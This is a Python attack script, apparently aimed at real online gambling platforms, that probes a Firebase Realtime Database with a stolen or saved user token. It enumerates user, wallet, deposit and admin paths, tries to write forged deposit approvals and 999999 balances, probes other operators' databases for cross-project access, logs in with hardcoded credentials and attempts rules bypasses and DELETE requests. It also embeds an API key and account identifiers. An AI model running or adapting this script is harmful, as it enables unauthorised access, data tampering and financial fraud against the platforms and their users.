#!/usr/bin/env python3
"""probe_we88c_rtdb_full.py — Maximum effort RTDB probe for we88c."""
import json
import requests
import time
import uuid
import base64

API_KEY = "AIzaSyAI5j8kaGDUcUDE5ZMk9Um4CneqEx-4q-s"
RTDB_URL = "https://we88zz-default-rtdb.asia-southeast1.firebasedatabase.app"
TID = "54ef7626cb381f4bab8be91f0cdbce47"
PLAYER_ID = "266d74e3-d6ca-47eb-b9ac-b8c45574bad4"

# Read saved Firebase ID token
fb_token = open(".fb_we88c_id_token.txt").read().strip()
print(f"=== Firebase ID Token ===")
print(f"Token: {fb_token[:80]}...")

# Decode token to check claims
payload = fb_token.split('.')[1]
payload += '=' * (4 - len(payload) % 4)
claims = json.loads(base64.urlsafe_b64decode(payload))
print(f"\nClaims:")
for k, v in claims.items():
    if isinstance(v, dict):
        print(f"  {k}: {json.dumps(v)[:100]}")
    else:
        print(f"  {k}: {v}")

fb_uid = claims.get("user_id") or claims.get("sub")
print(f"\nFirebase UID: {fb_uid}")

# 1. Comprehensive path probing
print(f"\n=== 1. Probing all RTDB paths ===")
paths = [
    "/",
    "/users",
    f"/users/{fb_uid}",
    f"/users/{PLAYER_ID}",
    "/deposits",
    "/transactions",
    "/wallets",
    "/notifications",
    "/config",
    "/settings",
    "/public",
    "/admin",
    "/system",
    "/pending",
    "/approved",
    "/queue",
    "/events",
    "/logs",
    # Specific structures from vak88z
    f"/users/{PLAYER_ID}/DEPOSIT_APPROVE",
    f"/users/{PLAYER_ID}/DEPOSIT_CONFIRM",
    f"/users/{PLAYER_ID}/wallet",
    f"/users/{PLAYER_ID}/balance",
    f"/users/{PLAYER_ID}/deposits",
    f"/users/{PLAYER_ID}/transactions",
]

accessible = []
for path in paths:
    url = f"{RTDB_URL}{path}.json?auth={fb_token}&shallow=true"
    try:
        r = requests.get(url, timeout=15)
        if r.status_code == 200:
            data = r.json()
            if data is not None:
                if data:
                    print(f"  [DATA] {path}: {json.dumps(data)[:150]}")
                    accessible.append(path)
                else:
                    print(f"  [EMPTY] {path}")
                    accessible.append(path)
            else:
                print(f"  [NULL] {path}")
                accessible.append(path)
        elif "Permission denied" in r.text:
            pass  # Skip denied silently
        else:
            print(f"  [{r.status_code}] {path}")
    except requests.exceptions.Timeout:
        print(f"  [TIMEOUT] {path}")
    except Exception as e:
        print(f"  [ERROR] {path}: {str(e)[:50]}")

print(f"\nAccessible paths: {len(accessible)}")

# 2. Write tests on accessible paths
print(f"\n=== 2. Testing WRITE access ===")
test_id = str(uuid.uuid4())[:8]
test_time = int(time.time() * 1000)

write_tests = [
    # Try to write to user's space
    (f"/users/{PLAYER_ID}", {"test": True, "timestamp": test_time}),
    (f"/users/{PLAYER_ID}/DEPOSIT_APPROVE/{test_id}", {
        "amount": "99999.00",
        "approve_status": "success",
        "approved_by": "system",
        "status": "success",
        "timestamp": test_time,
        "uid": PLAYER_ID
    }),
    (f"/users/{PLAYER_ID}/wallet", {
        "balance": 999999.0,
        "credit": 999999.0,
        "timestamp": test_time
    }),
    (f"/users/{PLAYER_ID}/balance", 999999.0),
    # Try to write to global paths
    (f"/deposits/{test_id}", {"amount": 99999, "status": "approved", "uid": PLAYER_ID}),
    (f"/transactions/{test_id}", {"amount": 99999, "status": "success", "uid": PLAYER_ID}),
    (f"/pending/{test_id}", {"amount": 99999, "status": "pending", "uid": PLAYER_ID}),
    (f"/public/test_{test_id}", {"test": True}),
]

for path, data in write_tests:
    url = f"{RTDB_URL}{path}.json?auth={fb_token}"
    try:
        r = requests.put(url, json=data, timeout=15)
        if r.status_code == 200:
            print(f"  [WRITE OK] {path}")
        elif "Permission denied" in r.text:
            print(f"  [DENIED] {path}")
        else:
            print(f"  [{r.status_code}] {path}: {r.text[:80]}")
    except Exception as e:
        print(f"  [ERROR] {path}: {str(e)[:50]}")

# 3. Check other Firebase projects
print(f"\n=== 3. Checking other Firebase RTDB projects ===")
other_rtdbs = [
    "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://slxoz1688-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://luxino-dev-gs-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://slotvip666z-default-rtdb.asia-southeast1.firebasedatabase.app",
]

for rtdb in other_rtdbs:
    url = f"{rtdb}/users/{PLAYER_ID}.json?auth={fb_token}&shallow=true"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200 and r.json():
            print(f"  [CROSS-PROJECT] {rtdb}")
            print(f"    Data: {json.dumps(r.json())[:200]}")
        elif r.status_code == 401:
            print(f"  [AUTH FAIL] {rtdb}")
    except Exception:
        pass

# 4. Check wallet on platform
print(f"\n=== 4. Platform wallet check ===")
# Get fresh JWT
r = requests.post(f"https://{TID}pbapi.asdgapicenterssdo.com/pb/authentication",
    headers={"Content-Type": "application/json"},
    json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
    timeout=15)
jwt = r.json().get("accessToken")

r = requests.get(f"https://{TID}mgapi.asdgapicenterssdo.com/mb/wallet",
    headers={"Authorization": f"Bearer {jwt}", "template": "vn"},
    timeout=15)
if r.ok:
    data = r.json().get("data", [{}])
    balance = data[0].get("balance", "?") if isinstance(data, list) else "?"
    print(f"  Platform wallet: {balance} THB")

# 5. Try Firebase rules bypass
print(f"\n=== 5. Firebase rules bypass attempts ===")

# Try without auth (public access)
url = f"{RTDB_URL}/.json"
r = requests.get(url, timeout=10)
print(f"  No auth: {r.status_code} {'(public)' if r.ok else '(denied)'}")

# Try with .read and .write query params (old Firebase vulnerability)
url = f"{RTDB_URL}/.json?.read=true&.write=true"
r = requests.get(url, timeout=10)
if r.ok and r.json():
    print(f"  Rules bypass: SUCCESS")
    print(f"    Data: {json.dumps(r.json())[:200]}")

# Try REST API with different methods
for method in ["PATCH", "POST", "DELETE"]:
    url = f"{RTDB_URL}/test.json?auth={fb_token}"
    try:
        r = requests.request(method, url, json={"test": True}, timeout=10)
        if r.status_code == 200:
            print(f"  {method}: OK")
    except Exception:
        pass

print(f"\n=== Done ===")
